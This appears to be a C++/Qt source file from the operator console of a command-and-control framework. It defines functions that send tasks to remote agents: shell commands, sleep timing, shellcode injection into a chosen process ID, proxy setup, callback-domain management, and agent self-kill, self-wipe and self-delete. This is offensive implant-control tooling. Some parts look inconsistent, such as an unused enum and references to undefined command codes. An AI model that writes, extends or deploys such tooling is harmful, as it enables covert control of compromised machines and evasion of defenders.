

#include "Include/command/command.h"
#include "Include/transport/packager.hpp"
#include "Include/transport/connector.hpp"
#include "Include/helper/base.hpp"

enum class Commands
{

    SLEEP = 11,
    SOCKET = 2540,
    SHELL = 1,
    EXIT = 99,

};

int CodeShell = 1;
int CodeFS = 2;
int CodeSleep = 3;
int CodeProcList = 4;

const int SessionType = 0x7;
const int SessionNewSession = 0x1;
const int SessionRemove = 0x2;
const int SessionSendCommand = 0x3;
const int SessionReceiveCommand = 0x4;
#define CodeSendCommnad 1

void CommandExecute::ProcList(QString TaskID, bool FromProcessManager)
{
}

auto NewPackageCommand(const QString &TeamserverName, Body_t Body) -> void
{
    auto Package = new _Package;
    auto Head = Head_t{
        .Event = SessionType,
        .User = Teamserver->User.toStdString(),
        .Time = QTime::currentTime().toString("hh:mm:ss").toStdString(),
    };

    Package->Head = Head;
    Package->Body = Body;
    Connect->SendPackage(Package);
    qDebug("Sending Commnad ->");

    delete Package;

}


void CommandExecute::InitialiseBody(QString TaskID, CommandsCode CommandID, Body_t &Body)
{
    QJsonObject Info;
    Info.insert("TaskID", TaskID);
    Info.insert("TargetID", this->CommandsInstance->Target->TargetData->ID);
    Info.insert("CommandID", QString::number(static_cast<int>(CommandID)));

    Body.SubEvent = CodeSendCommnad;
    Body.Info = Info;
}

void CommandExecute::ProcModule(QString TaskID, int SubCommand, QString Args)
{
    qDebug("in Execute.ProcModule");
    qDebug("%s", qPrintable(TaskID));
    qDebug("%s", qPrintable(this->CommandsInstance->Target->TargetData->ID));
    qDebug("%s", qPrintable(QString::number(static_cast<int>(CommandsCode::SHELL))));
    qDebug("%s", qPrintable(QString::number(SubCommand)));
    qDebug("%s", qPrintable(Args));

    Body_t Body;
    InitialiseBody(TaskID, CommandsCode::SHELL, Body);

    Body.Info.insert("Args", Args);
    Body.Info.insert("ProcCommand", QString::number(SubCommand));

    qDebug("Body.SubEvent %d", static_cast<int>(Body.SubEvent));
    NewPackageCommand(Teamserver->User, Body);
}



void CommandExecute::Sleep(QString TaskID, QString seconds)
{
    Body_t Body;
    InitialiseBody(TaskID, CommandsCode::SLEEP, Body);
    qDebug("seconds: %s", qPrintable(seconds));

    Body.Info.insert("Args", seconds);

    NewPackageCommand(Teamserver->User, Body);
}



void CommandExecute::ShellcodeInject(QString TaskID, QString TargetPID, QString Path)
{
    auto Content = FileRead(Path);
    if (Content.isEmpty()){

        return;
}
    Body_t Body;
    InitialiseBody(TaskID, CommandsCode::INJECT_SHELLCODE, Body);

    Body.Info.insert("Binary", QString::fromUtf8(Content.toBase64()));
    Body.Info.insert("PID", TargetPID);


    NewPackageCommand(Teamserver->User, Body);
}


void CommandExecute::ProxyStart(QString TaskID, QString CallBackHostName, QString AgentConnectPort, QString ProxyListenerPort)
{
    Body_t Body;
    InitialiseBody(TaskID, CommandsCode::PROXY_START, Body);

    // Directly setting the values in the QJsonObject
    Body.Info.insert("CallBackHostName", CallBackHostName);
    Body.Info.insert("AgentConnectPort", AgentConnectPort);
    Body.Info.insert("ProxyListenerPort", ProxyListenerPort);

    NewPackageCommand(Teamserver->User, Body);
}



void CommandExecute::ProxyStop(QString TaskID, QString CallBackHostName, QString AgentConnectPort, QString ProxyListenerPort)
{
    Body_t Body;
    InitialiseBody(TaskID, CommandsCode::PROXY_STOP, Body);

    // Inserting the proxy details directly into the QJsonObject
    Body.Info.insert("CallBackHostName", CallBackHostName);
    Body.Info.insert("AgentConnectPort", AgentConnectPort);
    Body.Info.insert("ProxyListenerPort", ProxyListenerPort);

    NewPackageCommand(Teamserver->User, Body);
}


void CommandExecute::AddCallBackDomain(QString TaskID, QString CallBackDomain)
{
    Body_t Body;
    InitialiseBody(TaskID, CommandsCode::ADD_DOMAIN, Body);

    // Using QJsonObject to insert the callback domain directly
    Body.Info.insert("CallBackDomain", CallBackDomain);

    NewPackageCommand(Teamserver->User, Body);
}


void CommandExecute::DeleteCallBackDomain(QString TaskID, QString CallBackDomain)
{
    Body_t Body;
    InitialiseBody(TaskID, CommandsCode::DELETE_DOMAIN, Body);

    Body.Info.insert("CallBackDomain", CallBackDomain);

    NewPackageCommand(Teamserver->User, Body);
}


void CommandExecute::ListCallBackDomain(QString TaskID)
{

    Body_t Body = {0};
    InitialiseBody(TaskID, CommandsCode::LIST_DOMAIN, Body);
    NewPackageCommand(Teamserver->User, Body);


}

void CommandExecute::SelfKill(QString TaskID)
{

    Body_t Body = {0};
    InitialiseBody(TaskID, CommandsCode::SELF_KILL, Body);
    NewPackageCommand(Teamserver->User, Body);


}


void CommandExecute::SelfWipe(QString TaskID)
{

    Body_t Body = {0};
    InitialiseBody(TaskID, CommandsCode::SELF_WIPE, Body);
    NewPackageCommand(Teamserver->User, Body);


}

void CommandExecute::SelfDel(QString TaskID)
{

    Body_t Body = {0};
    InitialiseBody(TaskID, CommandsCode::SELF_DEL, Body);
    NewPackageCommand(Teamserver->User, Body);


}


void CommandExecute::TaskList(QString TaskID)
{

    Body_t Body = {0};
    InitialiseBody(TaskID, CommandsCode::TASK_LIST, Body);
    NewPackageCommand(Teamserver->User, Body);


}
void CommandExecute::TaskDel(QString TaskID, QString DelTaskID)
{

    Body_t Body = {0};
    InitialiseBody(TaskID, CommandsCode::TASK_DEL, Body);
    Body.Info.insert("DelTaskID", DelTaskID);
    NewPackageCommand(Teamserver->User, Body);


}


void CommandExecute::TasksClean(QString TaskID)
{

    Body_t Body = {0};
    InitialiseBody(TaskID, CommandsCode::TASKS_CLEAN, Body);
    NewPackageCommand(Teamserver->User, Body);


}


CommandExecute::CommandExecute()
{
}






